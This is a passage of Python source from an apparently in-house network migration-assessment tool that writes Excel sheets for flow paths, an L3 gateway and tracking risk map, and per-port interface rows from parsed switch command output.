    for col, h in enumerate(headers, 1):
        c = ws.cell(r, col, h)
        c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343")
        c.alignment = Alignment(horizontal="center")
    r += 1
    for hop in flow["hops"]:
        vals = [hop["n"], hop["layer"], hop["from"], hop["to"], hop["iface"], hop["detail"],
                "YES" if hop["spof"] else ""]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v)
            if hop["spof"]:
                c.fill = PatternFill("solid", fgColor="F4CCCC")
        r += 1

    for i, w in enumerate([5, 8, 16, 16, 16, 60, 7], 1):
        ws.column_dimensions[chr(64 + i)].width = w

    logger.info(f"  [OK] '{FLOW_TRACE_SHEET_NAME}' sheet: {len(flow['hops'])} hop(s), "
                f"risk {s['risk']}, {s['spof_count']} SPOF(s)")


FLOW_PATHS_SHEET_NAME = "Flow Paths"


def write_flow_paths_sheet(wb, flow_paths: dict) -> None:
    """NEW-V3.23.126: the workbook twin of the explorer's Flow Simulator — representative end-to-end
    flow paths (one per consecutive-VLAN pair, lowest-IP endpoint each) with their L1-L3 hops, SPOFs
    and risk. From compute_flow_paths(). Pure presentation; the explorer remains the interactive view."""
    fp = flow_paths or {}
    flows = fp.get("flows") or []
    ws = _new_sheet(wb, FLOW_PATHS_SHEET_NAME)
    bold = Font(bold=True)
    ws.cell(1, 1, "Representative Flow Paths").font = Font(bold=True, size=14, color=DOC_NAVY_HEX)
    s0 = fp.get("summary") or {}
    ws.cell(2, 1, f"{s0.get('n_flows', 0)} representative flow(s) · {s0.get('n_at_risk', 0)} at-risk "
                  f"(HIGH/CRITICAL) · {s0.get('n_partitioned', 0)} partitioned. Static twin of the explorer "
                  f"Flow Simulator: the lowest-IP endpoint per VLAN, traced L1-L3 end to end.").font = \
        Font(italic=True, size=9)
    r = 4
    if not flows:
        ws.cell(r, 1, "No endpoint IPs in scope to trace (endpoint identity empty).").font = bold
        for i, w in enumerate([5, 10, 18, 18, 16, 60, 7], 1):
            ws.column_dimensions[chr(64 + i)].width = w
        logger.info("  [OK] 'Flow Paths' sheet: 0 flow(s)")
        return
    headers = ["#", "Layer", "From", "To", "Interface", "Detail", "SPOF"]
    for flow in flows:
        s = flow["summary"]
        ws.cell(r, 1, flow["label"]).font = Font(bold=True, size=11, color=DOC_NAVY_HEX); r += 1
        ws.cell(r, 1, "Verdict").font = bold
        vc = ws.cell(r, 2, f"{s.get('flow_type', '')} · risk {s.get('risk', '')}"
                           + (f" · SPOFs: {', '.join(s.get('spofs') or [])}" if s.get("spofs") else " · no SPOF"))
        if s.get("risk") in _RISK_FILL:
            vc.fill = PatternFill("solid", fgColor=_RISK_FILL[s["risk"]]); vc.font = bold
        r += 1
        for col, h in enumerate(headers, 1):
            hc = ws.cell(r, col, h); hc.font = Font(bold=True, color="FFFFFF")
            hc.fill = PatternFill("solid", fgColor="434343"); hc.alignment = Alignment(horizontal="center")
        r += 1
        for hop in flow["hops"]:
            vals = [hop["n"], hop["layer"], hop["from"], hop["to"], hop["iface"], hop["detail"],
                    "YES" if hop["spof"] else ""]
            for col, v in enumerate(vals, 1):
                hc = ws.cell(r, col, v)
                if hop["spof"]:
                    hc.fill = PatternFill("solid", fgColor="F4CCCC")
            r += 1
        r += 1
    for i, w in enumerate([5, 10, 18, 18, 16, 60, 7], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] 'Flow Paths' sheet: {len(flows)} flow(s), {s0.get('n_at_risk', 0)} at-risk")


L3_FORWARDING_SHEET_NAME = "L3 Forwarding Map"

def _parse_track(output: str) -> dict:
    """Best-effort 'show track' (IOS + NX-OS) -> {objects:[{id,desc,state}], up, down}.
    State is Up/Down/'' (unknown). Device-level; not bound to a specific SVI."""
    objs: List[dict] = []
    cur = None
    for line in output.splitlines():
        m = re.match(r"^Track\s+(\d+)\b", line.strip())
        if m:
            cur = {"id": m.group(1), "desc": "", "state": ""}
            objs.append(cur)
            continue
        if cur is None:
            continue
        sm = (re.search(r"\b(?:reachability|line[- ]protocol|list|threshold|state)\s+is\s+(up|down)\b", line, re.IGNORECASE)
              or re.search(r"\bis\s+(up|down)\b", line, re.IGNORECASE))
        if sm and not cur["state"]:
            cur["state"] = sm.group(1).capitalize()
        elif not cur["desc"] and line.strip() and not re.search(r"\b(up|down)\b", line, re.IGNORECASE):
            cur["desc"] = line.strip()[:40]
    down = sum(1 for o in objs if o["state"].lower() == "down")
    up = sum(1 for o in objs if o["state"].lower() == "up")
    return {"objects": objs, "up": up, "down": down}

def _track_summary(tr: dict) -> str:
    if not tr:
        return ""
    if not tr["objects"]:
        # 'show track' collected and empty (no tracked objects configured) is a FACT; 'show track'
        # never collected is a blind spot. Both used to render the same blank cell. (review #18)
        return "" if tr.get("observed") else HEALTH_NOT_OBSERVED
    head = f"{len(tr['objects'])} obj"
    if tr["down"]:
        head += f" ({tr['down']} DOWN)"
    detail = "; ".join(f"T{o['id']}:{o['state'] or '?'}" for o in tr["objects"][:6])
    return f"{head} - {detail}" if detail else head

def write_l3_forwarding_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]],
                              all_cmd_to_files: Dict[str, Dict[str, str]]) -> List[dict]:
    """Write the 'L3 Forwarding Map' sheet and return its records for the snapshot."""

    # gateways per VLAN across all scanned switches (for the redundancy signal)
    vlan_gw: Dict[int, set] = {}
    for host in all_interfaces:
        for port, d in all_interfaces[host].items():
            m = re.match(r"^Vlan(\d+)$", port, re.IGNORECASE)
            if m and (d.svi_ip or d.hsrp_behavior or d.subnet_primary_route):
                vlan_gw.setdefault(int(m.group(1)), set()).add(host)

    # per-device object tracking (best effort)
    track_by_host: Dict[str, dict] = {}
    for host in all_interfaces:
        out = _load_cmd_output(all_cmd_to_files.get(host, {}), "show track")
        # `observed` keeps "collected, no tracked objects" apart from "never collected" — without it the
        # tracked-object-down check silently cannot fire and the row still reads a bare 'ok'. (review #18)
        tr = _parse_track(out) if out else {"objects": [], "up": 0, "down": 0}
        tr["observed"] = bool(out)
        track_by_host[host] = tr

    headers = ["Switch", "VLAN", "SVI IP", "FHRP", "Role", "Virtual IP", "Routing Source",
               "Next Hop", "Primary Subnet", "Backup / Secondary", "Tracking", "L3 Risk"]

    records: List[dict] = []
    for host in sorted(all_interfaces):
        tr = track_by_host.get(host, {"objects": [], "up": 0, "down": 0, "observed": False})
        tsum = _track_summary(tr)
        for port, d in sorted(all_interfaces[host].items(),
                              key=lambda kv: int(re.match(r"^Vlan(\d+)$", kv[0], re.IGNORECASE).group(1))
                              if re.match(r"^Vlan(\d+)$", kv[0], re.IGNORECASE) else 1 << 30):
            m = re.match(r"^Vlan(\d+)$", port, re.IGNORECASE)
            if not m:
                continue
            if not (d.svi_ip or d.hsrp_behavior or d.subnet_primary_route):
                continue
            vid = int(m.group(1))
            proto, role, vip, _grp = _parse_fhrp(d.hsrp_behavior)
            gw_count = len(vlan_gw.get(vid, set()))

            flags: List[str] = []
            sev = "Info"
            if tr["down"] > 0:
                flags.append("tracked-object-down"); sev = "High"
            if gw_count <= 1:
                flags.append("single-gateway")
                if sev != "High":
                    sev = "Medium"
            elif not proto:
                flags.append("no-FHRP")
                if sev == "Info":
                    sev = "Low"
            if not flags:
                # `show track` is not essential either: without it the tracked-object-down check above
                # could never fire, so a bare 'ok' here asserted a clean tracking state that was never
                # looked at. Gateway redundancy and FHRP WERE assessed, so the marker names the one
                # axis that was not. (review #18, same class as Physical Risk)
                flags = ["ok"] if tr.get("observed") else [
                    f"{HEALTH_NOT_OBSERVED} - no 'show track' evidence; object tracking NOT assessed"]

            records.append({"switch": host, "vlan": vid, "svi_ip": d.svi_ip or "",
                            "fhrp": proto or "none", "role": role or "", "vip": vip or "",
                            "routing_source": d.routing_source or "", "next_hop": d.route_next_hop or "",
                            "primary_subnet": d.subnet_primary_route or "",
                            "secondary": d.subnet_secondary_routes or "",
                            "tracking": tsum, "risk": "; ".join(flags), "severity": sev})

    ws = _new_sheet(wb, L3_FORWARDING_SHEET_NAME)
    hdr_font = Font(bold=True, color="FFFFFF")
    hdr_fill = PatternFill("solid", fgColor="434343")
    for col, h in enumerate(headers, 1):
        c = ws.cell(1, col, h)
        c.font = hdr_font
        c.fill = hdr_fill
        c.alignment = Alignment(horizontal="center")
    for r, rec in enumerate(records, 2):
        vals = [rec["switch"], rec["vlan"], rec["svi_ip"], rec["fhrp"], rec["role"], rec["vip"],
                rec["routing_source"], rec["next_hop"], rec["primary_subnet"], rec["secondary"],
                rec["tracking"], rec["risk"]]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v)
            if col == len(headers) and rec["severity"] in _SEV_FILL:
                c.fill = PatternFill("solid", fgColor=_SEV_FILL[rec["severity"]])
    for i, w in enumerate([16, 7, 15, 7, 9, 15, 16, 16, 18, 22, 30, 26], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"

    n_blind = sum(1 for x in records if str(x["risk"]).startswith(HEALTH_NOT_OBSERVED))
    n_flagged = sum(1 for x in records
                    if x["risk"] != "ok" and not str(x["risk"]).startswith(HEALTH_NOT_OBSERVED))
    logger.info(f"  [OK] '{L3_FORWARDING_SHEET_NAME}' sheet: {len(records)} gateway SVI(s), "
                f"{n_flagged} flagged"
                + (f", {n_blind} with tracking NOT assessed (no 'show track')" if n_blind else ""))
    return records


# =============================================================================
# The main interface template filler (PHASE 2.7 step 26). Writes one row per
# physical port into the 'Migration Assessment' template sheet, matching existing
# host/port rows or appending. This produces the golden's interface sheet, so the
# logic is byte-exact. Uses find_header_row/ensure_headers/sortkey (above) + the
# template header map.
# =============================================================================
#: Template columns the ENGINEER owns, not the device: the engine never collects them, so a blank in
#: this run means "the engine has nothing to say", not "this run observed nothing" — their pre-existing
#: value is the engineer's annotation and must survive a re-run. EVERY OTHER column is device-derived:
#: it is a claim about what this collection SAW, so a blank there must clear the cell rather than leave
#: the previous run's value standing beside a freshly-overwritten Status. (review #88)
#: Columns a blank must NOT clear, because a blank there is not "the device stopped reporting it".
#:
#: `system_owner` / `endpoint_location` are pure annotation — the engine never observes them.
#: `endpoint_type` is HYBRID and belongs here for a sharper reason: `build.py` sets it only inside
#: the CDP/LLDP neighbour loop, so a port with no CDP neighbour (a PC, a non-CDP phone, anything
#: unmanaged) has no engine value on ANY run — which is precisely the port where an engineer types
#: one in, because the engine cannot tell them what it is. Clearing on blank would therefore delete
#: that annotation on every single re-run, and only ever for the ports whose annotation is worth
#: most. Weigh the two failure modes: a stale endpoint_type is cosmetic, while a stale VLAN, native
#: VLAN, trunk or BPDU-guard is a cutover decision made on last quarter's evidence. Review #88 is
#: about the second kind; this column is the first.
_HUMAN_OWNED_COLS = frozenset({"system_owner", "endpoint_location", "endpoint_type"})


def append_interface_rows(ws, header_row: int, col_map: Dict[str,int],
                          hostname: str, interfaces: Dict[str, InterfaceData]):
    # This writer takes a bare worksheet (no workbook), so it cannot go through _new_sheet; it writes
    # device text via DIRECT `cell.value = ...`, which only the Cell.value setter guard covers. Install
    # it here so the protection does not depend on the caller having called harden_workbook. (review #63)
    _install_cell_value_guard()
    required_cols = [col_map["hostname"], col_map["port"], col_map["status"]]

    def row_is_writable(r):
        return not any(isinstance(ws.cell(row=r, column=c), MergedCell) for c in required_cols)

    existing_rows: Dict[Tuple[str,str],int] = {}
    for r in range(header_row+1, ws.max_row+1):
        if not row_is_writable(r): continue
        hv = ws.cell(row=r, column=col_map["hostname"]).value
        pv = ws.cell(row=r, column=col_map["port"]).value
        if hv and pv:
            existing_rows[(str(hv).strip(), normalize_ifname(str(pv).strip()))] = r

    def next_empty_row(start):
        r = start
        while True:
            if not row_is_writable(r): r += 1; continue
            if ws.cell(row=r, column=col_map["hostname"]).value not in (None,""): r += 1; continue
            return r

    append_row = next_empty_row(header_row+1)

    for port in sorted(interfaces.keys(), key=sortkey):
        d      = interfaces[port]
        norm_p = normalize_ifname(port)
        if norm_p.lower().startswith(("vlan","lo","loop","null","tunnel","mgmt0")): continue
        if port.strip().startswith("%"): continue
        if not PHYSICAL_IFACE_RE.match(norm_p):
            if not re.match(r"^(Fa|mgmt)\d", norm_p, re.IGNORECASE): continue

        key = (hostname, normalize_ifname(port))
        if key in existing_rows:
            row = existing_rows[key]
        else:
            row = next_empty_row(append_row)
            append_row = row + 1

        ws.cell(row=row, column=col_map["hostname"], value=hostname)
        ws.cell(row=row, column=col_map["port"],     value=d.port)
        ws.cell(row=row, column=col_map["status"],   value=d.status)

        def w(field, val):
            if field not in col_map: return
            cell = ws.cell(row=row, column=col_map[field])
            if isinstance(cell, MergedCell): return
            if val:
                cell.value = val
            elif field in _HUMAN_OWNED_COLS:
                cell.value = cell.value or None      # engineer's annotation — the engine never observes it
            else:
                # Device-derived and NOT observed this run. Keeping the old value produced rows whose
                # Hostname/Port/Status were fresh (those three are overwritten unconditionally) while
                # VLAN / native VLAN / BPDU-guard were the PREVIOUS run's, rendered identically — and
                # this function is explicitly designed to match pre-existing rows, so re-running against
                # a filled template is the NORMAL path, not an edge case. (review #88)
                cell.value = None

        def w_po(field, val):
            if field not in col_map: return
            cell = ws.cell(row=row, column=col_map[field])
            if isinstance(cell, MergedCell): return
            # port_channel is device-derived: an unobserved value clears, exactly like w(). The
            # trunk-status-word branch is kept for the template shape it documents.
            existing = str(cell.value or "").strip().lower()
            if existing in _TRUNK_STATUS_WORDS: cell.value = val if val else None
            else: cell.value = val if val else None

        w("switchport_mode",      d.switchport_mode)
        w("vlan",                 d.vlan)
        w("vlan_name",            d.vlan_name)
        w("vrf",                  d.vrf)
        w("duplex",               d.duplex)
        w("speed",                d.speed)
        w("port_type",            d.port_type)
        w("link_type",            d.link_type)
        w("description",          d.description)
        w("end_host_mac",         d.end_host_mac)
        w("end_host_ip",          d.end_host_ip)
        w_po("port_channel",      d.port_channel)
        w("port_channel_protocol",d.port_channel_protocol)
        w("stp_blocked",          d.stp_blocked)
        w("stp_bpduguard",        d.stp_bpduguard)
        w("stp_rootguard",        d.stp_rootguard)
        w("poe_status",           d.poe_status)
        w("system_owner",         d.system_owner)
        w("endpoint_type",        d.endpoint_type)
        w("endpoint_location",    d.endpoint_location)
        w("dual_connection",      d.dual_connection)
        w("trunk_native_vlan",    d.trunk_native_vlan)
        w("trunk_allowed_vlans",  d.trunk_allowed_vlans)
        w("trunk_status",         d.trunk_status)
        w("arp_source_switch",    d.arp_source_switch)   # NEW-V11
        w("cdp_neighbor",         d.cdp_neighbor)        # NEW-V11
        # NEW-V14.2
        w("current_switch_serial",      d.current_switch_serial)
        w("current_switch_ip",          d.current_switch_ip)
        w("current_switch_vtp_domain",  d.current_switch_vtp_domain)
        w("neighbor_switch_serial",     d.neighbor_switch_serial)
        w("neighbor_switch_ip",         d.neighbor_switch_ip)
        w("neighbor_switch_vtp_domain", d.neighbor_switch_vtp_domain)
        w("subnet_primary_route",       d.subnet_primary_route)
        w("subnet_secondary_routes",    d.subnet_secondary_routes)
        w("route_next_hop",             d.route_next_hop)
        w("routing_source",             d.routing_source)
        w("hsrp_behavior",              d.hsrp_behavior)
        w("multicast_info",             d.multicast_info)
